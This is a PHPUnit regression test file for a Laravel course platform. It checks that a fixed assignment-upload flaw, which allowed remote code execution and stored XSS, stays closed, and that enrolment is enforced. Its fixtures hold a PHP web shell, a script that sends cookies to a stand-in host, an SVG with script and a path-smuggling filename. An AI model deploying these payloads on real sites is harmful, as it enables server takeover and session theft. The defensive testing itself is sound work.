<?php

namespace Tests\Feature\Api\Assignment;

use App\Models\Course;
use App\Models\CourseAssignment;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\Feature\Api\ApiTestCase;

/**
 * Regression tests for B-02 (Critical).
 *
 * The learner assignment upload accepted `required|file|max:20480` — any type
 * at all. HasFile then stored it on the *public* disk keeping the client's
 * extension, and `public/.htaccess` routes `^storage` to Laravel only when the
 * file does not exist, so Apache served it directly: `.php` meant RCE under
 * mod_php, `.html`/`.svg` meant stored XSS on the app's own origin. The
 * response returned `user_file_url`, handing over the exact path. There was
 * also no enrolment check of any kind.
 */
class AssignmentUploadSecurityTest extends ApiTestCase
{
    private function makeCourseWithAssignment(): array
    {
        $course     = Course::factory()->create();
        $assignment = CourseAssignment::factory()->create(['course_id' => $course->id]);

        return [$course, $assignment];
    }

    private function submitUrl(Course $course, CourseAssignment $assignment): string
    {
        return self::BASE."/courses/{$course->id}/assignments/{$assignment->id}/submit";
    }

    // ---------------------------------------------------------------------
    // Dangerous content is rejected
    // ---------------------------------------------------------------------

    public static function dangerousFiles(): array
    {
        return [
            'php web shell'    => ['shell.php', '<?php echo shell_exec($_GET["c"]); ?>'],
            'html with script' => ['x.html', '<script>fetch("//evil.test?c="+document.cookie)</script>'],
            'svg with script'  => ['x.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
        ];
    }

    #[DataProvider('dangerousFiles')]
    public function test_dangerous_uploads_are_rejected(string $name, string $contents): void
    {
        Storage::fake('private');
        Storage::fake('public');
        [$course, $assignment] = $this->makeCourseWithAssignment();
        ['model' => $user, 'headers' => $headers] = $this->userToken();
        $course->users()->attach($user->getKey());

        $response = $this->post(
            $this->submitUrl($course, $assignment),
            ['file' => UploadedFile::fake()->createWithContent($name, $contents)],
            $headers + ['Accept' => 'application/json'],
        );

        $response->assertStatus(422);
        $this->assertCount(0, Storage::disk('private')->allFiles(), 'Nothing should have been written.');
        $this->assertCount(0, Storage::disk('public')->allFiles(), 'Nothing should have been written.');
    }

    // ---------------------------------------------------------------------
    // Legitimate content still works, with a server-derived extension
    // ---------------------------------------------------------------------

    public function test_a_legitimate_pdf_is_accepted_and_stored_with_a_safe_name(): void
    {
        // Submissions moved to the private disk in A12 (B-10).
        Storage::fake('private');
        Storage::fake('public');
        [$course, $assignment] = $this->makeCourseWithAssignment();
        ['model' => $user, 'headers' => $headers] = $this->userToken();
        $course->users()->attach($user->getKey());

        $pdf = UploadedFile::fake()->createWithContent(
            'my submission.pdf',
            "%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n",
        );

        $response = $this->post(
            $this->submitUrl($course, $assignment),
            ['file' => $pdf],
            $headers + ['Accept' => 'application/json'],
        );

        $response->assertOk();

        $stored = Storage::disk('private')->allFiles();
        $this->assertCount(1, $stored);

        // Server-generated basename: the client's name must not survive.
        $this->assertStringNotContainsString('my submission', $stored[0]);
        $this->assertDoesNotMatchRegularExpression('/\.(php|phtml|html?|svg)$/i', $stored[0]);
    }

    public function test_stored_extension_is_derived_from_content_not_from_the_client_name(): void
    {
        Storage::fake('private');
        Storage::fake('public');
        [$course, $assignment] = $this->makeCourseWithAssignment();
        ['model' => $user, 'headers' => $headers] = $this->userToken();
        $course->users()->attach($user->getKey());

        // Real plain text, but the client calls it .csv — allowed either way.
        // The point is that the stored extension comes from the contents.
        $this->post(
            $this->submitUrl($course, $assignment),
            ['file' => UploadedFile::fake()->createWithContent('notes.csv', "a,b,c\n1,2,3\n")],
            $headers + ['Accept' => 'application/json'],
        )->assertOk();

        $stored = Storage::disk('private')->allFiles();
        $this->assertCount(1, $stored);
        $this->assertMatchesRegularExpression('/\.(txt|csv)$/i', $stored[0]);
    }

    /**
     * PHP source uploaded under a permitted name is never stored executable.
     *
     * Harness limitation, stated plainly: `UploadedFile::fake()` reports the
     * MIME type derived from the *filename*, not from the bytes, so this case
     * cannot exercise the `mimetypes:` rule the way a real upload does. In
     * production finfo detects `text/x-php`, which is not in the allow-list,
     * and the request is rejected with 422.
     *
     * What this test does assert is the defence that holds regardless: even if
     * such a file reaches storage, HasFile::safeExtensionFor must never give it
     * an executable extension — which is what actually closed the RCE, since
     * Apache serves `/storage/**` directly.
     */
    public function test_php_content_under_a_permitted_name_is_never_stored_executable(): void
    {
        Storage::fake('private');
        Storage::fake('public');
        [$course, $assignment] = $this->makeCourseWithAssignment();
        ['model' => $user, 'headers' => $headers] = $this->userToken();
        $course->users()->attach($user->getKey());

        $this->post(
            $this->submitUrl($course, $assignment),
            ['file' => UploadedFile::fake()->createWithContent('report.pdf', '<?php echo shell_exec($_GET["c"]); ?>')],
            $headers + ['Accept' => 'application/json'],
        );

        $stored = array_merge(
            Storage::disk('private')->allFiles(),
            Storage::disk('public')->allFiles(),
        );

        // Either it was rejected outright (nothing stored) or it was stored
        // inert. Both are acceptable; an executable extension is not.
        $this->assertLessThanOrEqual(1, count($stored));

        foreach ($stored as $path) {
            $this->assertDoesNotMatchRegularExpression(
                '/\.(php\d?|phtml|phar|html?|svg|js)$/i',
                $path,
                "Stored file [$path] has an executable/active extension.",
            );
        }
    }

    /**
     * Direct check of the extension derivation, independent of the HTTP layer
     * and of the fake-upload MIME behaviour above.
     */
    public function test_safe_extension_is_derived_from_content(): void
    {
        $trait = new class {
            use \App\Http\Traits\HasFile;

            public function ext($file): string
            {
                return $this->safeExtensionFor($file);
            }
        };

        $tmp = tempnam(sys_get_temp_dir(), 'b02').'.pdf';

        // PHP source: finfo reports text/x-php, for which Symfony has no
        // extension mapping, so guessExtension() is null. A bare File carries
        // no client extension either, so we land on the final `bin` fallback —
        // inert, and in particular never `php`.
        file_put_contents($tmp, '<?php echo shell_exec($_GET["c"]); ?>');
        $this->assertSame('bin', $trait->ext(new \Symfony\Component\HttpFoundation\File\File($tmp)));

        // A real PDF is still recognised from its contents and keeps `pdf`.
        file_put_contents($tmp, "%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n");
        $this->assertSame('pdf', $trait->ext(new \Symfony\Component\HttpFoundation\File\File($tmp)));

        // An UploadedFile whose client name is hostile: the extension is
        // sanitised to alphanumerics, so path/extension smuggling cannot
        // survive it.
        file_put_contents($tmp, 'plain text body');
        $uploaded = new \Illuminate\Http\UploadedFile($tmp, 'x.p hp/../../evil', 'text/plain', null, true);
        $this->assertMatchesRegularExpression('/^[a-z0-9]{1,10}$/', $trait->ext($uploaded));

        @unlink($tmp);
    }

    // ---------------------------------------------------------------------
    // Enrolment
    // ---------------------------------------------------------------------

    public function test_a_learner_not_enrolled_in_the_course_cannot_submit(): void
    {
        Storage::fake('public');
        [$course, $assignment] = $this->makeCourseWithAssignment();
        ['headers' => $headers] = $this->userToken(); // deliberately not enrolled

        $response = $this->post(
            $this->submitUrl($course, $assignment),
            ['file' => UploadedFile::fake()->createWithContent('ok.txt', 'hello')],
            $headers + ['Accept' => 'application/json'],
        );

        $response->assertStatus(403);
        $this->assertCount(0, Storage::disk('public')->allFiles());
    }

    public function test_submitting_requires_authentication(): void
    {
        [$course, $assignment] = $this->makeCourseWithAssignment();

        $this->post(
            $this->submitUrl($course, $assignment),
            ['file' => UploadedFile::fake()->createWithContent('ok.txt', 'hello')],
            ['Accept' => 'application/json'],
        )->assertStatus(401);
    }

    public function test_assignment_from_another_course_returns_404(): void
    {
        Storage::fake('public');
        [$course] = $this->makeCourseWithAssignment();
        $otherCourse     = Course::factory()->create();
        $otherAssignment = CourseAssignment::factory()->create(['course_id' => $otherCourse->id]);

        ['model' => $user, 'headers' => $headers] = $this->userToken();
        $course->users()->attach($user->getKey());

        $this->post(
            $this->submitUrl($course, $otherAssignment),
            ['file' => UploadedFile::fake()->createWithContent('ok.txt', 'hello')],
            $headers + ['Accept' => 'application/json'],
        )->assertStatus(404);
    }
}
